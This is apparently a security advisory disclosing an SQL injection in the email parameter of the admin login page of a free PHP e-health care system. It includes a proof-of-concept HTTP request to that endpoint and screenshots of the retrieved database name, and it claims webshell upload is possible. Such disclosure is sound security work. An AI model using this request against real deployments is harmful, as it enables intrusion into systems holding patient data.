## E-Health Care System IN PHP adminlogin.php has SQL injection vulnerability

## supplier
https://code-projects.org/e-health-care-system-in-php-css-js-and-mysql-free-download/
## Vulnerability file
/Admin/adminlogin.php
## describe
There are unrestricted SQL injection attacks in e-health systems. The following parameters can be controlled: email. The function executes the email parameter into a SQL statement without any restrictions. A malicious attacker can exploit this vulnerability to obtain sensitive information in the server database. You can also get server permissions.
## code analysis
The email parameter in adminlogin.php is controlled and carried directly into the SQL statement, resulting in SQL injection, and the webshell file can be uploaded through the vulnerability

![image-20241102014411171](https://github.com/user-attachments/assets/ce6f45fd-b8eb-48c1-a43a-6785463e98b0)

Injection via parameter $_POST['email']
POC

```
POST /Admin/adminlogin.php HTTP/1.1
Host: healthcare
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:131.0) Gecko/20100101 Firefox/131.0
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/png,image/svg+xml,*/*;q=0.8
Accept-Language: zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2
Accept-Encoding: gzip, deflate, br
Content-Type: application/x-www-form-urlencoded
Content-Length: 45
Origin: http://healthcare
Connection: close
Referer: http://healthcare/Admin/adminlogin.php
Cookie: PHPSESSID=8v23podkjmaquido0cb9ctil38
Upgrade-Insecure-Requests: 1
Priority: u=0, i

email=1%40qq.com&admin_pswd=1234&submit=login
```

Get the database name: healthcare

![image-20241102014621429](https://github.com/user-attachments/assets/bb774572-1bbe-4c39-a49e-1e0ba809ee6e)

Discover

西安电子科技大学 李腾，谢亚轩

